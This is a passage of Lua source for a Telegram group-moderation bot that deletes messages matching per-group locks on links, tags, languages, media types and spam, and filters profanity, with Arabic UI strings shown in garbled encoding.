if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--        Markdown        --
elseif not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
if Devmfm:get(mustafa..'mfm:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--        Document        --
elseif msg.content_.ID == "MessageDocument" then
if not VipMem(msg) then
if msg.forward_info_ then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if Devmfm:get(mustafa..'mfm:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--         Inline         --
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not VipMem(msg) then
if Devmfm:get(mustafa..'mfm:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--        Sticker         --
elseif msg.content_.ID == "MessageSticker" then
if not VipMem(msg) then
if Devmfm:get(mustafa..'mfm:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
elseif msg.content_.ID == "MessageChatJoinByLink" then
if Devmfm:get(mustafa..'mfm:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
function get_welcome(extra,result,success)
if Devmfm:get(mustafa..'mfm:Groups:Welcomes'..msg.chat_id_) then
text = Devmfm:get(mustafa..'mfm:Groups:Welcomes'..msg.chat_id_)
else
text = 'โข ููุฑุช ุญุจู \nโข [firstname lastname] \nโข [@username]'
end
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
local text = text:gsub('username',(result.username_ or 'KKDKKB7'))
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
if Devmfm:get(mustafa.."mfm:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not Devmfm:get(mustafa..'mfm:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = mustafa,offset_ = 0,limit_ = 1},function(extra,abbas,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(mustafa) then 
if Devmfm:sismember(mustafa..'mfm:Groups',msg.chat_id_) then
BotText = "ููุนูู ูู ุงูุณุงุจู\nโ๏ธุงุฑุณู โซ ุงูุงูุงูุฑ ูุงุณุชูุชุน ุจุงููููุฒูุงุช"
else 
BotText = "ูุนุทูู ูุฌุจ ุฑูุนู ูุดุฑู\nโ๏ธุจุนุฏ ุฐูู ูุฑุฌู ุงุฑุณุงู ุงูุฑ โซ ุชูุนูู\nโ๏ธุณูุชู ุฑูุน ุงูุงุฏูููู ูุงูููุดุฆ ุชููุงุฆูุง"
end 
local mfmText = (Devmfm:get(mustafa.."mfm:Text:BotWelcome") or "โ๏ธูุฑุญุจุง ุงูุง ุจูุช ุงุณูู "..NameBot.."\nโ๏ธุญุงูุฉ ุงููุฌููุนู โซ "..BotText.."\nโ โ โ โ โ โ โ โ โ")
local mfmPhoto = (Devmfm:get(mustafa.."mfm:Photo:BotWelcome") or abbas.photos_[0].sizes_[1].photo_.persistent_id_)
if Devmfm:get(mustafa.."mfm:Photo:BotWelcome") or abbas.photos_[0] then
sendPhoto(msg.chat_id_,msg.id_,0,1,nil,mfmPhoto,mfmText)
else 
send(msg.chat_id_,msg.id_,mfmText)
end 
end   
end
end,nil)
end
if Devmfm:get(mustafa..'mfm:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban(msg.content_.members_[0].id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and BanAll(msg.content_.members_[0].id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if Devmfm:get(mustafa.."mfm:Lock:Welcome"..msg.chat_id_) then
if Devmfm:get(mustafa..'mfm:Groups:Welcomes'..msg.chat_id_) then
text = Devmfm:get(mustafa..'mfm:Groups:Welcomes'..msg.chat_id_)
else
text = 'โข ููุฑุช ุญุจู \nโข [firstname lastname] \nโข [@username]'
end
local text = text:gsub('firstname',(msg.content_.members_[0].first_name_ or ''))
local text = text:gsub('lastname',(msg.content_.members_[0].last_name_ or ''))
local text = text:gsub('username',(msg.content_.members_[0].username_ or 'KKDKKB7'))
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--        Contact         --
elseif msg.content_.ID == "MessageContact" then
if not VipMem(msg) then
if msg.forward_info_ then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if Devmfm:get(mustafa..'mfm:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--         Audio          --
elseif msg.content_.ID == "MessageAudio" then
if not VipMem(msg) then
if msg.forward_info_ then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if Devmfm:get(mustafa..'mfm:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--         Voice          --
elseif msg.content_.ID == "MessageVoice" then
if not VipMem(msg) then
if msg.forward_info_ then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if Devmfm:get(mustafa..'mfm:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--        Location        --
elseif msg.content_.ID == "MessageLocation" then
if not VipMem(msg) then
if msg.forward_info_ then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if Devmfm:get(mustafa..'mfm:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--         Video          --
elseif msg.content_.ID == "MessageVideo" then
if not VipMem(msg) then
if msg.forward_info_ then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if Devmfm:get(mustafa..'mfm:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--          Gif           --
elseif msg.content_.ID == "MessageAnimation" then
if not VipMem(msg) then
if msg.forward_info_ then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if Devmfm:get(mustafa..'mfm:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--         Text           --
elseif msg.content_.ID == "MessageText" then
if not VipMem(msg) then
Filters(msg,text)
if msg.forward_info_ then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if Devmfm:get(mustafa..'mfm:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.text_:match("@") then
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("#") then
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match(".[Xx][Yy][Zz]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
if not Devmfm:get(mustafa..'mfm:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(Devmfm:get(mustafa..'mfm:Spam:Text'..msg.chat_id_))
end
if Devmfm:get(mustafa..'mfm:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if Devmfm:get(mustafa.."mfm:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_) then
if text == "ุงูุบุงุก" then
send(msg.chat_id_,msg.id_,"โ๏ธุชู ุงูุบุงุก ุญูุธ ุงูุฑุงุจุท")       
Devmfm:del(mustafa.."mfm:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
Devmfm:set(mustafa.."mfm:Groups:Links"..msg.chat_id_,Link)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุญูุธ ุงูุฑุงุจุท ุจูุฌุงุญ', 1, 'md')
Devmfm:del(mustafa.."mfm:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end
local msg = data.message_
text = msg.content_.text_
if text and Constructor(msg) then 
if Devmfm:get('mustafaTEAM:'..mustafa.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^ุงูุบุงุก$") then 
Devmfm:del('mustafaTEAM:'..mustafa..'id:user'..msg.chat_id_)  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุงูุงูุฑ', 1, 'md')
Devmfm:del('mustafaTEAM:'..mustafa.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
Devmfm:del('mustafaTEAM:'..mustafa.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = Devmfm:get('mustafaTEAM:'..mustafa..'id:user'..msg.chat_id_)  
Devmfm:incrby(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_mfm(msg.chat_id_, msg.id_,  1, "โ๏ธุชู ุงุถุงูุฉ "..numadded..' ุฑุณุงูู', 1, 'md')
Devmfm:del('mustafaTEAM:'..mustafa..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if Devmfm:get('mustafaTEAM:'..mustafa.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^ุงูุบุงุก$") then 
Devmfm:del('mustafaTEAM:'..mustafa..'ids:user'..msg.chat_id_)  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุงูุงูุฑ', 1, 'md')
Devmfm:del('mustafaTEAM:'..mustafa.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
Devmfm:del('mustafaTEAM:'..mustafa.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = Devmfm:get('mustafaTEAM:'..mustafa..'ids:user'..msg.chat_id_)  
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..iduserr,numadded)  
Dev_mfm(msg.chat_id_, msg.id_,  1, "โ๏ธุชู ุงุถุงูุฉ "..numadded..' ููุทู', 1, 'md')
Devmfm:del('mustafaTEAM:'..mustafa..'ids:user'..msg.chat_id_)  
end
end
if text and (text:match("ุทูุฒ") or text:match("ุฏูุณ") or text:match("ุงููุฌ") or text:match("ููุฌ") or text:match("ุฏููุณ") or text:match("ุนูุฑ") or text:match("ูุณุฎุชู") or text:match("ูุณูู") or text:match("ูุณุฑุจู") or text:match("ุจูุงุน") or text:match("ุงุจู ุงูุนููุฑู") or text:match("ููููุฌ") or text:match("ูุญุจู") or text:match("ูุญุงุจ") or text:match("ุงููุญุจู") or text:match("ูุณู") or text:match("ุทูุฒู") or text:match("ูุณ ุงูู") or text:match("ุตุฑู") or text:match("ูุณ ุงุฎุชู")) then
if not Devmfm:get(mustafa.."mfm:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","โ๏ธููููุน ุงููุดุงุฑ ูู ุงููุฌููุนู")  
end end
if text and (text:match("ฺฌ") or text:match("ูบ") or text:match("ฺ") or text:match("ฺ") or text:match("ฺฟ") or text:match("ฺ") or text:match("ฺ") or text:match("?ซ") or text:match("ฺ") or text:match("ฺ") or text:match("?") or text:match("ฺธ") or text:match("ูพ") or text:match("?ด") or text:match("ูฺฉ") or text:match("ุฒุฏู") or text:match("ุฏุฎุชุฑุง") or text:match("ุฏ?ูุซ") or text:match("ฺฉู?ูพุดู") or text:match("ุฎูุดุดูู") or text:match("ู?ุฏุง") or text:match("ฺฉู") or text:match("ุจุฏุงู?ู") or text:match("ุจุง?ุฏ") or text:match("ุฒูุงุดู??") or text:match("ุขููุฒุด") or text:match("ุฑุงุญุช?") or text:match("ุฎุณุชู") or text:match("ุจ?ุงู") or text:match("ุจูพูุดู") or text:match("ูุฑูู")) then
if Devmfm:get(mustafa.."mfm:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
